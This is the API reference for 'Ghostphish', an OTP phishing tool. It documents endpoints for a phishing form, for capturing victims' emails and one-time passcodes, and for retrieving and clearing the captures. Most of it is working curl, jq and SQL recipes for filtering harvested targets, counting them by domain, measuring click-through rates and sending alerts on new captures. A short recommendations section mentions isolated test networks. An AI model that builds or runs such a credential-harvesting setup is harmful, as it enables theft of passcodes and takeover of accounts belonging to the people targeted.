# Ghostphish API Reference

Complete API documentation for Ghostphish OTP phishing tool.

## Base URL
```
http://localhost:8000
```

---

## Endpoints

### 1. GET / - Phishing Page

Returns the OTP phishing form.

**Request:**
```http
GET / HTTP/1.1
Host: localhost:8000
```

**Response:**
```
200 OK
Content-Type: text/html

[HTML form]
```

**Example:**
```bash
curl http://localhost:8000/
```

---

### 2. POST /submit-otp - Submit OTP

Captures email and OTP from user submission.

**Request:**
```http
POST /submit-otp HTTP/1.1
Host: localhost:8000
Content-Type: application/json

{
  "email": "user@example.com",
  "otp": "123456",
  "honeypot": ""
}
```

**Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| email | string | Yes | Target email address |
| otp | string | Yes | 6-digit OTP entered by user |
| honeypot | string | No | Hidden form field (should be empty) |

**Response Success (200):**
```json
{
  "success": true,
  "message": "OTP verified successfully",
  "redirect": "https://www.google.com"
}
```

**Response Error (429 - Rate Limited):**
```json
{
  "detail": "Too many attempts. Try again later."
}
```

**Response Error (400 - Missing Fields):**
```json
{
  "detail": "Missing email or OTP"
}
```

**Example:**
```bash
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@example.com",
    "otp": "123456",
    "honeypot": ""
  }'
```

---

### 3. GET /admin/captures - Get Captured Data

Retrieve all captured phishing attempts.

**Request:**
```http
GET /admin/captures HTTP/1.1
Host: localhost:8000
```

**Response (200):**
```json
{
  "total": 42,
  "captures": [
    {
      "id": 1,
      "timestamp": "2026-08-12T15:30:45.123456",
      "email": "victim@company.com",
      "otp": "654321",
      "honeypot": "",
      "ip_address": "192.168.1.100",
      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
      "referer": "https://example.com/secure",
      "attempt_number": 1
    },
    {
      "id": 2,
      "timestamp": "2026-08-12T15:31:12.654321",
      "email": "another@company.com",
      "otp": "123456",
      "honeypot": "",
      "ip_address": "10.0.0.50",
      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
      "referer": "https://example.com",
      "attempt_number": 1
    }
  ]
}
```

**Example:**
```bash
# Get all captures
curl http://localhost:8000/admin/captures

# Pretty print JSON
curl http://localhost:8000/admin/captures | jq .

# Count captures
curl http://localhost:8000/admin/captures | jq '.total'

# Get first capture only
curl http://localhost:8000/admin/captures | jq '.captures[0]'

# Filter by email
curl http://localhost:8000/admin/captures | jq '.captures[] | select(.email=="user@example.com")'
```

---

### 4. POST /admin/clear - Clear Captures

Delete all captured data from database.

**Request:**
```http
POST /admin/clear HTTP/1.1
Host: localhost:8000
```

**Response (200):**
```json
{
  "message": "All captures cleared"
}
```

**Example:**
```bash
curl -X POST http://localhost:8000/admin/clear
```

**⚠️ Warning:** This permanently deletes all captured data. Export first if needed.

---

### 5. GET /health - Health Check

Check if service is running and healthy.

**Request:**
```http
GET /health HTTP/1.1
Host: localhost:8000
```

**Response (200):**
```json
{
  "status": "ok"
}
```

**Example:**
```bash
curl http://localhost:8000/health
```

---

## Request Headers

**Important Headers:**
```
User-Agent: Browser identification (logged)
X-Forwarded-For: Real client IP (when behind proxy)
Referer: HTTP referer (logged)
```

**Example with headers:**
```bash
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "Referer: https://mail.google.com" \
  -d '{"email":"user@example.com","otp":"123456","honeypot":""}'
```

---

## Response Codes

| Code | Meaning | Example |
|------|---------|---------|
| 200 | OK | Successful OTP submission |
| 400 | Bad Request | Missing required fields |
| 429 | Too Many Requests | Rate limit exceeded |
| 500 | Server Error | Database error |

---

## Rate Limiting

**Configuration:**
- Max attempts: 5 per IP
- Lockout duration: 300 seconds (5 minutes)
- After lockout expires, counter resets

**Behavior:**
- First 5 attempts: Allowed
- 6th+ attempts: 429 Too Many Requests
- Wait 5 minutes, counter resets

**Bypass Notes:**
- Rate limit tracked by source IP
- X-Forwarded-For header respected (proxy scenarios)
- Each IP gets independent counter

---

## Data Logged

Each capture includes:

| Field | Type | Example |
|-------|------|---------|
| id | Integer | 1 |
| timestamp | ISO String | 2026-08-12T15:30:45.123456 |
| email | String | user@example.com |
| otp | String | 123456 |
| honeypot | String | (empty or filled) |
| ip_address | String | 192.168.1.100 |
| user_agent | String | Mozilla/5.0... |
| referer | String | https://mail.google.com |
| attempt_number | Integer | 1 |

---

## Advanced Usage

### Filter captures by date range

```bash
# Using jq to filter by date
curl http://localhost:8000/admin/captures | jq '.captures[] | select(.timestamp > "2026-08-12T15:00:00")'
```

### Export specific email

```bash
curl http://localhost:8000/admin/captures | \
  jq '.captures[] | select(.email=="target@example.com")' > target_captures.json
```

### Count successful attempts by domain

```bash
curl http://localhost:8000/admin/captures | \
  jq '.captures[] | .email | split("@")[1]' | \
  sort | uniq -c
```

### Get statistics with SQL

```bash
sqlite3 ./data/captures.db << EOF
SELECT 
  COUNT(*) as total,
  COUNT(DISTINCT email) as unique_emails,
  COUNT(DISTINCT ip_address) as unique_ips
FROM captures;
EOF
```

---

## Error Handling

### Missing Email
```bash
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -d '{"otp":"123456","honeypot":""}'

# Response: 400 Bad Request
# {"detail": "Missing email or OTP"}
```

### Missing OTP
```bash
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","honeypot":""}'

# Response: 400 Bad Request
# {"detail": "Missing email or OTP"}
```

### Rate Limited
```bash
# After 5 attempts from same IP
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","otp":"123456","honeypot":""}'

# Response: 429 Too Many Requests
# {"detail": "Too many attempts. Try again later."}
```

---

## Honeypot Detection

**Purpose:** Catch automated bot submissions

**Behavior:**
- Hidden form field that should always be empty
- If filled, submission logged but marked as honeypot
- User sees success message (bot trap)
- Logged to database for analysis

**Example:**
```json
{
  "email": "bot@example.com",
  "otp": "123456",
  "honeypot": "filled"  // Should be empty
}
```

**Detection Query:**
```bash
curl http://localhost:8000/admin/captures | jq '.captures[] | select(.honeypot != "")'
```

---

## Monitoring & Analytics

### Get total submissions
```bash
curl -s http://localhost:8000/admin/captures | jq '.total'
```

### Get unique targets
```bash
curl -s http://localhost:8000/admin/captures | jq '.captures | map(.email) | unique | length'
```

### Get click-through rate
```bash
# Assuming you track sent emails separately
sent=100
clicks=$(curl -s http://localhost:8000/admin/captures | jq '.total')
echo "CTR: $(echo "scale=2; $clicks * 100 / $sent" | bc)%"
```

### Get submissions by IP
```bash
curl -s http://localhost:8000/admin/captures | \
  jq -r '.captures[] | [.ip_address, .email] | @csv' | sort | uniq -c
```

---

## Integration Examples

### Webhook notification (custom)

```bash
# Log capture and send webhook
curl -X POST http://localhost:8000/submit-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","otp":"123456","honeypot":""}' \
  && curl -X POST https://your-webhook.url/phishing \
    -H "Content-Type: application/json" \
    -d '{"alert":"phishing_capture","email":"user@example.com"}'
```

### Slack notification (example)

```bash
#!/bin/bash
# Alert on new captures
while true; do
  count=$(curl -s http://localhost:8000/admin/captures | jq '.total')
  if [ "$count" -gt "$prev_count" ]; then
    curl -X POST https://hooks.slack.com/services/YOUR/WEBHOOK/URL \
      -d "{\"text\":\"[Ghostphish] $count captures so far\"}"
    prev_count=$count
  fi
  sleep 60
done
```

---

## Performance Notes

- Database queries with 1000+ records may be slow
- Use `/admin/captures?limit=100` pattern (not yet implemented) for pagination
- Export data regularly to manage database size
- Consider archiving old captures

---

## Security Recommendations

✅ **Do:**
- [ ] Only run on isolated test networks
- [ ] Secure the `/admin/*` endpoints with authentication
- [ ] Hash/encrypt captured OTPs in production
- [ ] Limit API access to authorized IPs
- [ ] Use HTTPS in production
- [ ] Audit all API access

❌ **Don't:**
- [ ] Expose API publicly without authentication
- [ ] Store plain-text OTPs long-term
- [ ] Share API endpoints in phishing emails
- [ ] Log sensitive data in application logs
- [ ] Leave database unencrypted

---

## Troubleshooting

### Connection Refused
```
Error: Connection refused
- Check if container is running: docker ps | grep ghostphish
- Check if port 8000 is correct
- Restart: docker-compose restart
```

### Database Lock
```
Error: database is locked
- Stop app: docker-compose stop
- Clear locks: python cleanup.py clear
- Restart: docker-compose start
```

### Rate Limit Always Triggered
```
- Check if X-Forwarded-For header is correct
- Verify proxy configuration
- Clear rate limits: python cleanup.py clear
```

---

## Support

For issues, check logs:
```bash
docker logs ghostphish
```

For database issues:
```bash
sqlite3 ./data/captures.db ".tables"
```

---

**Last Updated:** 2026-08-12  
**Version:** 1.0.0
